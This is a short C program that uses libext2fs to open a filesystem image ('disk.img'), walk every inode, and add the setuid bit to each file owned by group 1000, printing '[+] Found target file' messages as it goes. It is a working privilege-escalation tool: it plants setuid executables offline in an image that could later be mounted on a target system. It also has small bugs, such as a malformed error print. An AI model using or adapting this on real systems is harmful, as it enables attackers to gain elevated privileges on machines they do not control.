#include <stdio.h>
#include <unistd.h>
#include <ext2fs/ext2_fs.h>
#include <ext2fs/ext2fs.h> 
#include <sys/stat.h>


#define FSNAME "disk.img"

int main(void) {

  errcode_t ret;
  int file_count = 0;
  ext2_filsys fs = NULL;
  ext2_ino_t ino;
  struct ext2_inode inode;
  
  ext2_inode_scan scan;

  printf("Starting...\n");
  initialize_ext2_error_table();


  ret = ext2fs_open(FSNAME, EXT2_FLAG_RW | EXT2_FLAG_64BITS, 0, 0, unix_io_manager,&fs);

  if (ret) {
    fprintf(stderr, "%s: failed to open filesystem.\n", FSNAME);
    exit(-1);
  }


  ret = ext2fs_open_inode_scan(fs, 0, &scan);

  if (ret) {
    fprintf(stderr, "%S: cant start scan yo\n");
  }
  
  ret = ext2fs_get_next_inode_full(scan, &ino, &inode, sizeof(inode));

  if (ret) {
    fprintf(stderr, "%s: failed to get first inode.\n", FSNAME);
    exit(-2);
  }
  
  while (ino) {

    if (inode.i_gid == 1000) {
      fprintf(stdout, "--\n");
      fprintf(stdout, "[+] Found target file with uid: %d\n", inode.i_uid);
      fprintf(stdout, "[+] Found target file with gid: %d\n", inode.i_gid);
      fprintf(stdout, "[+] Found target file with mode: %d\n", inode.i_mode);            
      //      inode.i_mode = 33261 | 0x800;
      inode.i_mode = inode.i_mode | 0x800;      
      
      ret = ext2fs_write_inode(fs, ino, &inode);
      
      if (ret) {
	fprintf(stderr, "Failed to write inode");
      }
      else {
	fprintf(stdout, "Wrote to inode..\n");
      }
    }

    file_count++;
    ret = ext2fs_get_next_inode_full(scan, &ino, &inode, sizeof(inode));
  }

  ext2fs_close_inode_scan(scan );
  
  ext2fs_mark_super_dirty(fs);
  

  ret = ext2fs_close_free(&fs);
  if (ret) {
    fprintf(stderr, "%s: error while closing filesystem\n",FSNAME);
    exit(-4);
  }

  printf("Iterated %d times\n", file_count);
  printf("Stopping\n");
  return 0;
}

